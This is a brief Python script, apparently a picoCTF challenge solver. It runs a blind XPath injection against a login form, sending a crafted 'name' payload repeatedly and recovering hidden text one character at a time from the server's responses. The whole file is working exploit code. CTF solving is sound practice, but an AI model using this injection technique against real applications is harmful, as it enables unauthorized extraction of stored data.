import requests
from string import *

charecters = printable
#charecters = ascii_lowercase + ascii_uppercase + digits


def xpathloop(seed):
    seed2 = []
    for i in seed:
        for ch in charecters:
            st = i+ch
            data = {"name":f"' or //*[starts-with(text(),'{st}')] or '1'='","pass":""}
            #data = {"name":f"' or //*[starts-with(text(),'{st}')] or '1'='","pass":""}
            r = requests.post("http://mercury.picoctf.net:16521/", data=data)
            content = r.text
            if "on the right path" in content:
                seed2.append(st)
                break
    return seed2





#seed = "picoCTF{"
seed = []
for ch in charecters:
    st = ch
    data = {"name":f"' or //*[starts-with(text(),'{st}')] or '1'='","pass":""} 
    #data = {"name":f"' or //*[starts-with(text(),'{seed+st}')] or '1'='","pass":""}
    r = requests.post("http://mercury.picoctf.net:16521/", data=data)
    content = r.text
    if "on the right path" in content:
        seed.append(st)
while True:
    print(seed)
    seed = xpathloop(seed)
